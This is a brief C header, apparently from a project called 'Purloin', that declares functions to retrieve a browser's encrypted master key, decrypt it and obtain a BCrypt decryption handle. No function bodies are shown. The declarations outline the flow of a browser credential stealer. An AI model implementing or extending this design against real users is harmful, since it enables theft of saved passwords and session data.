#pragma once
#include "Purloin_Utils.h"
#include "Purloin_Debug.h"

BOOL get_encrypted_masterkey(PCWSTR browser_dir, PCWSTR data_file, PWCHAR enc_master_key, WORD enc_master_key_size, PSTR buf_outMsg, WORD buf_outSize);
BOOL decrypt_masterkey(PWCHAR enc_master_key, PCHAR char_master_key, WORD enc_char_master_key_size, DATA_BLOB* blob_dec_masterkey, PSTR buf_outMsg, WORD buf_outSize);
BOOL get_decryption_handler(BCRYPT_KEY_HANDLE* p_handle_key, DATA_BLOB* blob_dec_masterkey, PSTR buf_outMsg, WORD buf_outSize);